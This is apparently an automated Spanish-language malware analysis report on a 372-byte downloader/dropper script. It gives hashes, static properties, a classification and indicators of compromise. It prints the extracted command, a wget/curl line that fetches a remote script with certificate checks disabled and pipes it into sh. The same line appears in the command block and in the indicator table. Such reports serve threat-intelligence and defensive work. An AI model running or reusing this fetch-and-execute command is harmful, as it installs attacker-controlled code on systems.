# 🧬 Payload Analysis

`f3c2175d770bbe83fd7d50378cb9da1b80076aec19a1cf1587e3ef17ef2aaba5`

## 📌 Resumen

Artefacto identificado como ASCII text, with CRLF line terminators de 372 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `sh` en `hxxps://217.60.195.XXX/sh`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:38:58.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `f3c2175d770bbe83fd7d50378cb9da1b80076aec19a1cf1587e3ef17ef2aaba5`
- **MD5:** `6a64e4f8ae7ee895b5b675b1d9c8f8a0`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 372 B |
| Entropía | 5.12 |
| Strings | 9 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=6

## 🖥️ Comandos observados / extraídos

```text
(wget --no-check-certificate -qO- hxxps://217.60.195.XXX/sh || curl -sk hxxps://217.60.195.XXX/sh) | sh -s apache.selfre
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxps://217.60.195.XXX/sh) | strings |
| url | hxxps://217.60.195.XXX/sh | strings |
| ip | 190.179.175.XXX | static_analysis |
| ip | 217.60.195.XXX | static_analysis |
| command | (wget --no-check-certificate -qO- hxxps://217.60.195.XXX/sh \|\| curl -sk hxxps://217.60.195.XXX/sh) \| sh -s apache.selfre | strings |
| hash | f3c2175d770bbe83fd7d50378cb9da1b80076aec19a1cf1587e3ef17ef2aaba5 | static_analysis |
| ip | 209.126.10.XXX | artifact_source |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
